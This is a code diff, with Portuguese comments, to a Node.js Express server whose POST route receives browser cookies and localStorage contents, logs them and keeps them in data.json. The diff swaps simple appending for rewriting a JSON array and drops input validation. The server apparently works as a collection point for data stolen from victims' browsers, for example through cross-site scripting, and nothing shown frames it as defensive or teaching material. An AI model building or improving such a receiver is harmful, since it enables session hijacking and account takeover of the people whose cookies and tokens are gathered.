@@ -17,13 +17,8 @@ app.use(bodyParser.json());
 app.post('/', (req, res) => {
   const { cookies, localStorage } = req.body;
   console.log(cookies);
+  console.log('\n');
   console.log(localStorage);
-  // Verificando se os dados foram recebidos
-  if (!cookies || !localStorage) {
-    return res
-      .status(400)
-      .json({ error: 'Cookies ou localStorage não fornecidos' });
-  }
 
   // Gerando o caminho do arquivo onde os dados serão salvos
   const filePath = path.join(__dirname, 'data.json');
@@ -35,13 +30,28 @@ app.post('/', (req, res) => {
     timestamp: new Date().toISOString(),
   };
 
-  // Salvando os dados no arquivo
-  fs.appendFile(filePath, JSON.stringify(data, null, 2) + ',\n', (err) => {
-    if (err) {
-      return res.status(500).json({ error: 'Erro ao salvar os dados' });
+  // Lê o arquivo data.json
+  fs.readFile(filePath, 'utf8', (err, fileData) => {
+    let existingData = [];
+    if (!err && fileData) {
+      try {
+        existingData = JSON.parse(fileData); // Tenta parsear o conteúdo existente
+      } catch (err) {
+        console.error('Erro ao parsear o arquivo JSON:', err);
+      }
     }
 
-    res.status(200).json({ message: 'Dados salvos com sucesso!' });
+    // Adiciona os novos dados ao array existente
+    existingData.push(data);
+
+    // Reescreve o arquivo com os dados atualizados
+    fs.writeFile(filePath, JSON.stringify(existingData, null, 2), (err) => {
+      if (err) {
+        return res.status(500).json({ error: 'Erro ao salvar os dados' });
+      }
+
+      res.status(200).json({ message: 'Dados salvos com sucesso!' });
+    });
   });
 });
 
